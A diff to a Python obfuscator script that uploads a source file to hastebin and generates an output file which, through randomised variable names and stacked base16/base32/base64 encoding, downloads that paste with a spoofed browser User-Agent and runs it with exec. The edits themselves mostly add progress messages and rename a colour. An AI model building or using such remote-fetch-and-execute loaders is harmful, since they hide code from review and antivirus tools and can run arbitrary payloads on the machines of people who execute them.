@@ -40,14 +40,14 @@ ignore = ("b16encode", "b32encode", "b64encode")
 class Col:
     colors = {"red" : "\033[38;2;255;0;0m", 
               "green" : "\033[38;2;0;255;0m", 
-              "blue" : "\033[38;2;0;0;255m",
+              "cyan" : "\033[38;2;125;125;255m",
               "white" : "\033[38;2;255;255;255m"}
 
     red = colors['red']
 
     green = colors['green']
 
-    blue = colors['blue']
+    cyan = colors['cyan']
 
     white = colors['white']
 
@@ -99,12 +99,15 @@ else:
 
     
 print()
-print("Building obfuscated file...")
+print("\nBuilding obfuscated file...\n")
 
+defined = []
 
 def nfile(file:object, only:bool=False) -> tuple:
     
     temp_names = ["exec", "b16decode", "b32decode", "b64decode"] if only else [name for name in globals_names]
+
+    print("Defining globals variables...")
 
     for name in temp_names:
         random_name = random()
@@ -128,7 +131,11 @@ def nfile(file:object, only:bool=False) -> tuple:
     return exc, b16, b32, b64
 
 def random(l:int=2) -> str:
-    return "".join(choice(chars) + choice([choice(chars), str(randint(0,9))]) for _ in range(1, l+1))
+    while True:
+        rdm = "".join(choice(chars) + choice([choice(chars), str(randint(0,9))]) for _ in range(1, l+1))
+        if rdm not in defined:
+            defined.append(rdm)
+            return rdm
     
 
 def build():
@@ -136,10 +143,10 @@ def build():
     with open(file, 'r', encoding=encoding) as f:
         content = f.read()
 
-
+    print("Creating hastebin...")
     key = post("https://hastebin.com/documents", data=content.encode('utf-8')).json()["key"]
     url = "https://hastebin.com/raw/" + key
-
+    print(f"Hastebin created! Url: {url}.")
 
 
     file_1 = Create()
@@ -148,15 +155,21 @@ def build():
 
     urlp = random()
     req = random()
+
+    print("Importing HTTP requests lib...")
     file_1.write(f"from urllib.request import urlopen as {urlp}, Request as {req};")
 
     chars_list = random()
+    print("Creating content list...")
     file_1.write(f"{chars_list}=[];")
     content = f"""{exc}({urlp}({req}("{url}", headers={{"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}})).read())"""
 
+    print("Encoding content...")
     content = b16encode(b32encode(b64encode(content.encode(encoding)))).decode(encoding)
 
     random_chars_list = []
+
+    print("Building content list...")
 
     for char in content:
         random_char = random()
@@ -170,9 +183,10 @@ def build():
         file_1.write(f"{random_append_function}({random_char});")
 
     content_name = random()
+    print("Creating variable to be desobfuscated...")
     file_1.write(f"{content_name} = ''.join({chars_list});")
- 
 
+    print("Building desobfuscator...")
     file_1.write(f"{exc}({b64}({b32}({b16}({content_name}))));")
 
 
@@ -187,9 +201,14 @@ def build():
 
     exc, b16, b32, b64 = nfile(file_2)
 
+    print("Building second desobfuscator...")
+
     file_2.write(f'{exc}({b64}({b32}({b16}("{content}"))));')
 
+    print("\nCreating final content...")
     content = file_2.content
+
+    print("Writing content...")
 
     with open(output, 'w', encoding=encoding) as f:
         f.write(content)
@@ -198,6 +217,7 @@ def build():
 
 try:
     build()
-    input(Col.blue+"Done!"+Col.white)
+    print("\n")
+    input(Col.cyan+"Done!"+Col.white)
 except Exception as e:
     input(Col.red+"Error! [{}]".format(e)+Col.white)
